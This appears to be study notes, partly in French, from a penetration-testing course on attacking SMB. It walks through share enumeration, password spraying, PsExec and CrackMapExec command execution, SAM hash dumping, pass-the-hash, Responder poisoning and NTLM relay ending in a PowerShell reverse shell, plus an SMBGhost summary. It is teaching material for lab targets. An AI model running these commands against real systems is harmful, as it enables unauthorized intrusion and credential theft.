# Attacking SMB

***

<mark style="color:orange;">**Server Message Block (SMB)**</mark> is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using **TCP port `139`** and **UDP ports `137`** and `138`. However, with Windows 2000, Microsoft added the option to run SMB directly over **TCP/IP on port `445`** without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.

<mark style="color:orange;">**Samba**</mark> is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.

For instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.

Another protocol that is commonly related to SMB is [<mark style="color:orange;">**MSRPC (Microsoft Remote Procedure Call)**</mark>](https://en.wikipedia.org/wiki/Microsoft_RPC)<mark style="color:orange;">**.**</mark> RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.

***

## <mark style="color:red;">Enumeration</mark>

```shell-session
mrroboteLiot@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

```

The Nmap scan reveals essential information about the target:

* SMB version (Samba smbd 4.6.2)
* Hostname HTB
* Operating System is Linux based on SMB implementation

***

## <mark style="color:red;">Misconfigurations</mark>

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.

### <mark style="color:blue;">**Anonymous Authentication**</mark>

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc.&#x20;

***

### <mark style="color:blue;">**File Share**</mark>

Using <mark style="color:orange;">**`smbclient`**</mark>, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.

```shell-session
mrroboteLiot@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
```

<mark style="color:orange;">**`Smbmap`**</mark> is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```
{% endcode %}

Using <mark style="color:orange;">**`smbmap`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**with the**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`-r`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**or**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`-R`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**(recursive)**</mark> option, one can browse the directories:

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
```
{% endcode %}

From the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.

```shell-session
mrroboteLiot@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```shell-session
mrroboteLiot@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

***

### <mark style="color:blue;">**Remote Procedure Call (RPC)**</mark>

We can use the <mark style="color:orange;">**`rpcclient`**</mark> tool with a null session to enumerate a workstation or Domain Controller.

The `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)  [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

```shell-session
mrroboteLiot@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers
```

<mark style="color:orange;">**`Enum4linux`**</mark> is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

* Workgroup/Domain name
* Users information
* Operating system information
* Groups information
* Shares Folders
* Password policy information

```shell-session
mrroboteLiot@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
```

***

## <mark style="color:red;">Protocol Specifics Attacks</mark>

If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

***

### <mark style="color:blue;">**Brute Forcing and Password Spray**</mark>

{% hint style="warning" %}
**Password spraying** (spray de mots de passe) est une meilleure alternative, car nous pouvons cibler une liste de noms d'utilisateur avec un mot de passe commun pour éviter les verrouillages de comptes. Nous pouvons essayer plusieurs mots de passe si nous connaissons le seuil de verrouillage des comptes. En général, deux à trois tentatives sont sûres, à condition d'attendre 30 à 60 minutes entre chaque tentative. Explorons l'outil **CrackMapExec** qui inclut la capacité d'effectuer un **password spraying**.
{% endhint %}

Avec **CrackMapExec (CME)**, nous pouvons cibler plusieurs adresses IP en utilisant de nombreux utilisateurs et mots de passe. Examinons un cas d'utilisation quotidien du **password spraying**.&#x20;

```shell-session
mrroboteLiot@htb[/htb]$ cat /tmp/userlist.txt
```

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
{% endcode %}

[documentation guide](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials).

***

### <mark style="color:blue;">**SMB**</mark>

<mark style="color:orange;">**Remote Code Execution (RCE)**</mark>

Sysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/). One of those freeware tools to administer remote systems is PsExec.

{% hint style="warning" %}
PsExec est un outil qui permet d'exécuter des processus sur d'autres systèmes avec une interactivité complète pour les applications en console, sans avoir à installer de logiciel client manuellement.

Il fonctionne grâce à une image de service Windows intégrée dans son exécutable. Il déploie ce service sur le partage **admin$** (par défaut) de la machine distante. Ensuite, il utilise l'interface **DCE/RPC** via **SMB** pour accéder à l'API **Windows Service Control Manager**.

Une fois le service **PsExec** lancé sur la machine cible, celui-ci crée un **named pipe**, qui permet d'envoyer des commandes et d'exécuter des actions sur le système distant.
{% endhint %}

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

* [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
* [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
* [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
* [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

***

### <mark style="color:blue;">**Impacket PsExec**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ impacket-psexec -h


```

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```
{% endcode %}

### <mark style="color:blue;">**CrackMapExec**</mark>

Another tool we can use to run CMD or PowerShell is **`CrackMapExec`**. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
{% endcode %}

Note: If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

<mark style="color:orange;">**Enumerating Logged-on Users**</mark>

Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

```
{% endcode %}

<mark style="color:orange;">**Extract Hashes from SAM Database**</mark>

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
{% endcode %}

<mark style="color:orange;">**Pass-the-Hash (PtH)**</mark>

&#x20;We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools. Here is an example of how this would work with `CrackMapExec`:

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
{% endcode %}

***

### <mark style="color:blue;">**Forced Authentication Attacks**</mark>

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

The most common tool to perform such operations is the `Responder`. [<mark style="color:orange;">**Responder**</mark>](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Let's illustrate an example to understand better how `Responder` works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:

```shell-session
mrroboteLiot@htb[/htb]$ responder -I <interface name>
```

When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

* The hostname file share's IP address is required.
* The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
* If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
* Is there no local DNS record? A query will be sent to the DNS server that has been configured.
* If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo responder -I ens33
```
{% endcode %}

These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

{% hint style="warning" %}
Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.
{% endhint %}

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
{% endcode %}

The NTLMv2 hash was cracked. The password is `P@ssword`. If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
mrroboteLiot@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
{% endcode %}

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JA..kA'
```
{% endcode %}

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

```shell-session
mrroboteLiot@htb[/htb]$ nc -lvnp 9001
```

***

## <mark style="color:red;">**RPC**</mark>

In the [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:

* Change a user's password.
* Create a new domain user.
* Create a new shared folder.

We also cover enumeration using RPC in the [Active Directory Enumeration & Attacks module](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.

***

{% hint style="warning" %}
#### <mark style="color:orange;">🔍</mark> <mark style="color:orange;"></mark><mark style="color:orange;">**Résumé de la faille SMBGhost (CVE-2020-0796)**</mark>

**1. Description de la Faille :**\
SMBGhost est une vulnérabilité affectant **Windows 10 (versions 1903 et 1909)** via le protocole **SMB v3.1.1**.

* L'attaque permet à un pirate non authentifié de réaliser une **exécution de code à distance (RCE)** et de prendre le contrôle complet du système cible.
* La faille est liée à un mécanisme de compression mal sécurisé lors de la négociation SMB.

***

**2. Concept de l'attaque :**\
L'attaque repose sur une **surcharge d'entier (integer overflow)** dans une fonction du pilote SMB.

* Lorsqu'une quantité excessive de données compressées est envoyée au serveur SMB, la mémoire tampon (buffer) est dépassée.
* Ce dépassement permet d'**écraser les instructions du CPU** et d'exécuter des commandes malveillantes.

***

**3. Étapes de l'attaque** \
**Initiation de l'attaque :**

1. L'attaquant envoie une **requête SMB modifiée** au serveur.
2. Le serveur traite les **paquets compressés**.
3. Ce traitement s'effectue avec les **privilèges du système** ou administrateur.
4. Le processus local traite ces paquets malveillants.

**Exécution de code à distance (RCE) :**\
5\. L'attaquant remplace les **instructions du buffer** par du code malveillant.\
6\. Le CPU exécute ces **nouvelles instructions**, déclenchant l'overflow.\
7\. Les privilèges du serveur SMB sont utilisés.\
8\. L'attaquant obtient un accès distant au système cible.
{% endhint %}
